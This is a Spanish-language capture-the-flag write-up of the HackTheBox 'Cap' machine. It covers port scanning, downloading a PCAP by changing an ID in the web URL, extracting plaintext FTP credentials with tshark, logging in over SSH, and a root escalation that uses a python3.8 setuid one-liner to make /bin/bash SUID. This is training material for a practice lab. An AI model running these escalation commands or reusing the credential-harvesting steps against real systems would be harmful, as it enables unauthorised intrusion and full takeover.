---
title: "Cap Write-UP | HackTheBox"
date: "2021-06-25"
categories: [Write-Ups, HackTheBox]
tags: [CTFs, HackTheBox, Write-Ups]
media_subpath: /assets/img/posts/2021-06-25-cap-write-up-hackthebox
image:
   path: header/cap_card.webp
   lqip: data:image/webp;base64,UklGRmQAAABXRUJQVlA4IFgAAACQAwCdASoUAA0APzmGuVOvKSWisAgB4CcJZAAAVOqs/DkChDpAAP7Q7FHN23rPsFerQQax9IPYFVlsqZzJuGIkiIFK3GaZiZsJfpd36J5QuVZg64AOaAAA
   
published: true
---

## Descripción

En esta máquina **Cap** de la plataforma **Hackthebox** con dificultad "Easy" y OS Linux, haremos uso de técnicas de enumeración en el sitio web proporcionado, utilizaremos **Tshark** para analizar paquetes de un archivo PCAP y realizaremos escalada de privilegios vertical utilizando **capabilities** en binario Python para obtener usuario privilegiado **root.** En si es una máquina muy facil pero nos puede volver loco si no nos fijamos bien en los pequeños detalles.

Como punto a comentar, la dirección IP de la máquina activa y la que se muestran en las imágenes y/o comandos utilizados son diferentes, ya que se ha utilizado instancia personal para la realización de dicho laboratorio.

## Escaneo y Enumeración

Comenzaremos como siempre con una traza ICMP para descubrir el tipo de SO que utiliza la máquina objetivo en base al TTL.

Nos encontramos con una máquina de SO GNU/Linux:

```bash
ping -c 1 10.129.161.225              
PING 10.129.161.225 (10.129.161.225) 56(84) bytes of data.
64 bytes from 10.129.161.225: icmp_seq=1 ttl=63 time=50.5 ms

--- 10.129.161.225 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 50.510/50.510/50.510/0.000 ms
```

Hacemos uso de la herramienta **NMAP** para descubrir puertos abiertos:

```bash
# Nmap 7.91 scan initiated Thu Jun 17 09:35:34 2021 as: nmap -sS -p- --open -n -Pn -oG allPorts -oN cap.initScan 10.129.161.225
Nmap scan report for 10.129.161.225
Host is up (0.050s latency).
Not shown: 65515 closed ports, 17 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Observamos que tiene 3 puertos abiertos con los servicios corriendo: **FTP(21),** **SSH(22) y HTTP(80)**.

Lanzamos nuevamente **NMAP** para intentar descubrir vulnerabilidades conocidas y versión utilizada por los servicios corriendo en los puertos abiertos encontrados:

```bash
# Nmap 7.91 scan initiated Thu Jun 17 09:37:11 2021 as: nmap -sC -sV -p21,22,80 -n -Pn -oN cap.services 10.129.161.225                                                                                                                                       
Nmap scan report for 10.129.161.225                                                                                                                                                                                                                          
Host is up (0.055s latency).                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                             
PORT   STATE SERVICE VERSION                                                                                                                                                                                                                                 
21/tcp open  ftp     vsftpd 3.0.3                                                                                                                                                                                                                            
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                                               
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)                                                                                                                                                                                               
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)                                                                                                                                                                                              
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)                                                                                                                                                                                            
80/tcp open  http    gunicorn                                                                                                                                                                                                                                
| fingerprint-strings:                                                                                                                                                                                                                                       
|   FourOhFourRequest:                                                                                                                                                                                                                                       
|     HTTP/1.0 404 NOT FOUND                                                                                                                                                                                                                                 
|     Server: gunicorn                                                                                                                                                                                                                                       
|     Date: Thu, 17 Jun 2021 07:37:24 GMT                                                                                                                                                                                                                    
|     Connection: close                                                                                                                                                                                                                                      
|     Content-Type: text/html; charset=utf-8                                                                                                                                                                                                                 
|     Content-Length: 232                                                                                                                                                                                                                                    
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">                                                                                                                                                                                                
|     <title>404 Not Found</title>                                                                                                                                                                                                                           
|     <h1>Not Found</h1>                                                                                                                                                                                                                                     
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>                                                                                                                        
|   GetRequest:                                                                                                                                                                                                                                              
|     HTTP/1.0 200 OK                                                                                                                                                                                                                                        
|     Server: gunicorn                                                                                                                                                                                                                                       
|     Date: Thu, 17 Jun 2021 07:37:18 GMT                                                                                                                                                                                                                    
|     Connection: close                                                                                                                                                                                                                                      
|     Content-Type: text/html; charset=utf-8                                                                                                                                                                                                                 
|     Content-Length: 19386                                                                                                                                                                                                                                  
|     <!DOCTYPE html>                                                                                                                                                                                                                                        
|     <html class="no-js" lang="en">                                                                                                                                                                                                                         
|     <head>                                                                                                                                                                                                                                                 
|     <meta charset="utf-8">                                                                                                                                                                                                                                 
|     <meta http-equiv="x-ua-compatible" content="ie=edge">                                                                                                                                                                                                  
|     <title>Security Dashboard</title>                                                                                                                                                                                                                      
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                                                                                                   
|     <link rel="shortcut icon" type="image/png" href="/static/body/icon/favicon.ico">                                                                                                                                                                     
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">                                                                                                                                                                                           
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">                                                                                                                                                                                        
|     <link rel="stylesheet" href="/static/css/themify-icons.css">                                                                                                                                                                                           
|     <link rel="stylesheet" href="/static/css/metisMenu.css">                                                                                                                                                                                               
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 17 Jun 2021 07:37:18 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
SF-Port80-TCP:V=7.91%I=7%D=6/17%Time=60CAFBAE%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20
SF:Thu,\\x2017\\x20Jun\\x202021\\x2007:37:18\\x20GMT\\r\\nConnection:\\x20close\\r\\
SF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20193
SF:86\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20class=\\"no-js\\"\\x20lang=\\"en\\">\\
SF:n\\n<head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\"utf-8\\">\\n\\x20\\x20\\x20\\x2
SF:0<meta\\x20http-equiv=\\"x-ua-compatible\\"\\x20content=\\"ie=edge\\">\\n\\x20\\
SF:x20\\x20\\x20<title>Security\\x20Dashboard</title>\\n\\x20\\x20\\x20\\x20<meta\\
SF:x20name=\\"viewport\\"\\x20content=\\"width=device-width,\\x20initial-scale=
SF:1\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"shortcut\\x20icon\\"\\x20type=\\"image
SF:/png\\"\\x20href=\\"/static/body/icon/favicon\\.ico\\">\\n\\x20\\x20\\x20\\x20<
SF:link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/css/bootstrap\\.min\\.css\\">
SF:\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/css/fon
SF:t-awesome\\.min\\.css\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20
SF:href=\\"/static/css/themify-icons\\.css\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=
SF:\\"stylesheet\\"\\x20href=\\"/static/css/metisMenu\\.css\\">\\n\\x20\\x20\\x20\\x2
SF:0<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/css/owl\\.carousel\\.min\\.
SF:css\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/c
SF:ss/slicknav\\.min\\.css\\">\\n\\x20\\x20\\x20\\x20<!--\\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Thu,\\x2
SF:017\\x20Jun\\x202021\\x2007:37:18\\x20GMT\\r\\nConnection:\\x20close\\r\\nConten
SF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20HEAD,\\x20OPTIONS,\\x
SF:20GET\\r\\nContent-Length:\\x200\\r\\n\\r\\n")%r(RTSPRequest,121,"HTTP/1\\.1\\x2
SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20text
SF:/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n<html>\\n\\x20\\x20<head>\\n\\x20\\x20
SF:\\x20\\x20<title>Bad\\x20Request</title>\\n\\x20\\x20</head>\\n\\x20\\x20<body>\\
SF:n\\x20\\x20\\x20\\x20<h1><p>Bad\\x20Request</p></h1>\\n\\x20\\x20\\x20\\x20Invali
SF:d\\x20HTTP\\x20Version\\x20&#x27;Invalid\\x20HTTP\\x20Version:\\x20&#x27;RTSP
SF:/1\\.0&#x27;&#x27;\\n\\x20\\x20</body>\\n</html>\\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20T
SF:hu,\\x2017\\x20Jun\\x202021\\x2007:37:24\\x20GMT\\r\\nConnection:\\x20close\\r\\n
SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20232\\
SF:r\\n\\r\\n<!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\"-//W3C//DTD\\x20HTML\\x203\\.2\\x20
SF:Final//EN\\">\\n<title>404\\x20Not\\x20Found</title>\\n<h1>Not\\x20Found</h1>
SF:\\n<p>The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20ser
SF:ver\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x20ch
SF:eck\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.</p>\\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que el servicio corriendo en el puerto **21(FTP)** se trata de un **vsftpd 3.0.3**, podríamos intentar encontrar algun exploit conocido, pero ya os adelanto que no hay ninguno, al menos para explotación y acceso al sistema.

Intentamos autenticarnos en el servicio FTP con usuario **anonymous** para comprobar si este se encuentra habilitado:

```bash
# ftp 10.129.164.125
Connected to 10.129.164.125.
220 (vsFTPd 3.0.3)
Name (10.129.164.125:rekkatz): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

No se encuentra habilitada la autenticación para el usuario anonymous.

Lanzamos el script de **http-enum** de Nmap para que realice una búsqueda rápida de posibles directorios interesantes en el sitio web:

```bash
# Nmap 7.91 scan initiated Wed Jun 23 09:24:41 2021 as: nmap --script http-enum -p80 -Pn -n -oN cap.webScan 10.129.164.125
Nmap scan report for 10.129.164.125
Host is up (0.050s latency).

PORT   STATE SERVICE
80/tcp open  http
```

No encuentra absolutamente nada.

Utilizamos la herramienta **whatweb** para identificar de una pasada el sitio web:

```bash
# whatweb <http://10.129.161.225>                                                                                                       
<http://10.129.161.225> [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.129.161.225], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

Pasamos a echar un vistazo al sitio web para ver que nos encontramos. En primer lugar vemos varias gráficas y un panel a la izquierda con diferentes herramientas. He intentado capturar las peticiones de las herramientas con Burpsuite para ver si podía inyectar comandos en los parámetros, pero no ha sido posible.

![](body/861f8979a65cefa6112e149e08a09b7cb447ca02.png)

Nos llama la atención "**Security Snapshot 5 second PCAP + Anaysis**", por lo tanto podemos pensar que está realizando una captura de 5 segundos capturando el tráfico que recibe, pero si nos fijamos bien, en la URL aparece un dígito (1), por lo que intento búscar posibles archivos que se encuentren aumentando o disminuyendo este dígito.

![](body/c628062498a02c53e4b2de6cb38bcef491dfec8d.png)

Después de incrementar el número varias veces y perder el tiempo...me da por poner dígito 0 y ahi lo tenemos, un archivo PCAP para descargar...

![](body/497d744bba5c8f136e5c1b6ee53e9fb52055d088.png)

Descargamos el archivo PCAP y pasamos a analizarlo con TSHARK (también podemos abrirlo con Wireshark perfectamente, pero de esta forma practicamos con terminal).

Abrimos el archivo descargado con Tshark con la opción "-r" para leer archivos, nos damos cuenta que tiene paquetes capturados con protocolo FTP, el cual no está cifrado ya que no utiliza comunicación segura a través de TLS/SSL.

Echando un vistazo rápido, podemos ver las trazas de autenticación con el servidor FTP y obtener USER y PASS:

```bash
# tshark -r 0.pcap                                                                                                                                                                              

(...)
   34   2.626895 192.168.196.16 → 192.168.196.1 FTP 76 Response: 220 (vsFTPd 3.0.3)
   35   2.667693 192.168.196.1 → 192.168.196.16 TCP 62 54411 → 21 [ACK] Seq=1 Ack=21 Win=1051136 Len=0
   36   4.126500 192.168.196.1 → 192.168.196.16 FTP 69 Request: USER nathan
   37   4.126526 192.168.196.16 → 192.168.196.1 TCP 56 21 → 54411 [ACK] Seq=21 Ack=14 Win=64256 Len=0
   38   4.126630 192.168.196.16 → 192.168.196.1 FTP 90 Response: 331 Please specify the password.
   39   4.167701 192.168.196.1 → 192.168.196.16 TCP 62 54411 → 21 [ACK] Seq=14 Ack=55 Win=1051136 Len=0
   40   5.424998 192.168.196.1 → 192.168.196.16 FTP 78 Request: PASS Buck3tH4TF0RM3!
   41   5.425034 192.168.196.16 → 192.168.196.1 TCP 56 21 → 54411 [ACK] Seq=55 Ack=36 Win=64256 Len=0
   42   5.432387 192.168.196.16 → 192.168.196.1 FTP 79 Response: 230 Login successful.
(...)
```

> **USER**: nathan
>
> **PASS**: Buck3tH4TF0RM3!

Si queremos jugar un poco más con la terminal y **Tshark**, podemos obtener directamente los campos en los cuales se realiza la comunicación de los comandos utilizados con el servicio FTP y los argumentos de estos, indicando únicamente protocolo FTP y los campos en los cuales viajan los valores que queremos visualizar: "**ftp.request.command**" y "**ftp.request.arg**", por último aplicamos **sed** para eliminar las líneas en blanco que nos muestra el output de Tshark:

```bash
# tshark -r 0.pcap -O FTP -Tfields -e ftp.request.command -e ftp.request.arg | sed "/^\s*$/d"

USER    nathan
PASS    Buck3tH4TF0RM3!
SYST
PORT    192,168,196,1,212,140
LIST
PORT    192,168,196,1,212,141
LIST    -al
TYPE    I
PORT    192,168,196,1,212,143
RETR    notes.txt
QUIT
```

## Explotación

Ahora que tenemos usuario y contraseña, tenemos la posibilidad de autenticarnos con el servicio FTP (la cual es válida y podemos ver user.txt), pero nos interesaría más obtener una shell con el usuario obtenido **nathan** para tener acceso al sistema y con TTY completamente interactiva, así que pasamos a intentar autenticarnos con el servicio **SSH (22)**:

![](body/82420cacad2e05ec98d5726c09a2a6eea99d69fb.png)

### User Flag

Una vez dentro del sistema, ahora sí pasamos a visualizar la flag de usuario:

```bash
nathan@cap:~$ ls -l
total 4
-r-------- 1 nathan nathan 33 Jun 23 07:08 user.txt

nathan@cap:~$ wc -c user.txt 
33 user.txt
```

## Escalada de privilegios

Enumeramos los privilegios de usuario como por ejemplo los permisos que tenemos con SUDO ya que tenemos la contraseña. No obtenemos nada:

```bash
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
```

Enumeramos los usuarios a nivel de sistema que tienen asignada shell, ya sea bash, csh, sh, zsh...

```bash
nathan@cap:~$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
nathan:x:1001:1001::/home/nathan:/bin/bash
```

Como vemos, solo existen 2 usuarios a nivel de sistema: **root** y **nathan**, por lo tanto no tenemos que realizar escalada de privilegios horizontal, si no únicamente vertical.

Enumeramos posibles archivos que tengan asignado permisos **SUID**, tampoco obtenemos gran cosa, ninguno interesante que nos permite la escalada:

```bash
nathan@cap:~$ find / -perm /4000 2>/dev/null | grep -v snap
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

Enumeramos las posibles **capabilities** que estén asignadas a binarios del sistema (con el nombre de la máquina **CAP** ya tendríamos que ir a tiro hecho, pero vamos a suponer que la máquina no se llama tal cual xD):

```bash
 nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Bueno, como vemos tenemos asignada la capability **cap\_setuid** al binario de **python3.8**. La escalada de privilegios va a ser muy muy facil:

Tendremos que ejecutar python3.8 e importar la librería OS y asignarnos el permiso SUID 0 para operar como usuario privilegiado **root**.

Cuando tenemos este tipo de escaladas, a mi me gusta personalmente asignar permisos SUID al binario BASH para así tener persistencia en caso de desconexión, etc. Esto no lo recomiendo si estáis realizando los laboratorios free de la plataforma HTB ya que puede perjudicar a otros usuarios que estén realizando la misma máquina que vosotros, en mi caso tengo el VIP de HTB y las instancias de las máquinas son personales.

Bueno, vamos allá:

```bash
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("chmod 4755 /bin/bash")'
```

Una vez ejecutamos el comando anterior con la llamada a Python3.8, vemos que se a asignado el permiso SUID al binario Bash:

![](body/7f5471f4ef66dce8f0b458012dbce597669e97d6.png)

Como siempre, solo nos quedaría ejecutar bash con la opción -p para obtener shell con el contexto de usuario root

```bash
nathan@cap:~$ bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1001(nathan) gid=1001(nathan) euid=0(root) groups=1001(nathan)
```

### Root Flag

Ya podemos visualizar la flag de root:

```bash
bash-5.0# cd /root/

bash-5.0# ls -l
total 8
-r-------- 1 root root   33 Jun 23 07:08 root.txt
drwxr-xr-x 3 root root 4096 May 23 19:17 snap

bash-5.0# wc -c root.txt 
33 root.txt
```
